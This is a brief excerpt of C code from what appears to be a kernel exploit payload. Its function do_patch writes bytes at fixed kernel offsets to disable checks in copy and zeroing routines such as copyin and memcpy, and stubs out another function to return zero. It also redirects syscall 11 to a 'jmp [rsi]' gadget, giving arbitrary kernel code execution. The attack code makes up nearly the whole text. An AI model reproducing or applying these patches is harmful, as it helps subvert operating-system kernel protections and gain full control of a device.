...
static inline void do_patch(void *kbase) {
    ...
    write8(kbase, 0x11464d, 0xeb); // bzero
    write8(kbase, 0x114691, 0xeb); // pagezero
    write8(kbase, 0x11470d, 0xeb); // memcpy
    write8(kbase, 0x114751, 0xeb); // pagecopy
    write8(kbase, 0x1148fd, 0xeb); // copyin
    write8(kbase, 0x114dad, 0xeb); // copyinstr
    write8(kbase, 0x114e7d, 0xeb); // copystr
    ...
    //     mov     rbp, rsp
    //     ...
    write32(kbase, 0x1a810, 0xc3c03148);
    ...
    write8(kbase, 0x24026d, 0x37);
    write8(kbase, 0x240270, 0x37);
    ...
    // }
    const u64 sysent_11_off = 0x111b750;
    // .sy_narg = 2
    write32(kbase, sysent_11_off, 2);
    // .sy_call = gadgets['jmp qword ptr [rsi]']
    write64(kbase, sysent_11_off + 8, kbase + 0x3f0c9);
